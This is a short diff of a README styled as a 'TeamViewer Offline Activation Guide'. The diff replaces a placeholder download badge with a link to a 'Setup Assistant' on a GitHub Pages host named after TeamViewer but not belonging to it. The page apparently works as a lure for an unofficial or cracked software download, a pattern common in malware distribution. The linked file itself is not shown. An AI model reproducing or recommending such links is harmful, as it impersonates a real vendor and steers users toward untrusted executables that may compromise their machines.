@@ -1,6 +1,6 @@
 # TeamViewer — Offline Activation Guide
 🔘 **Download the Setup Assistant**  
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://link-to-setup-assistant)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://teamviewer-desktop.github.io/.github/)
 
 ## ⚙️ How to Use
 
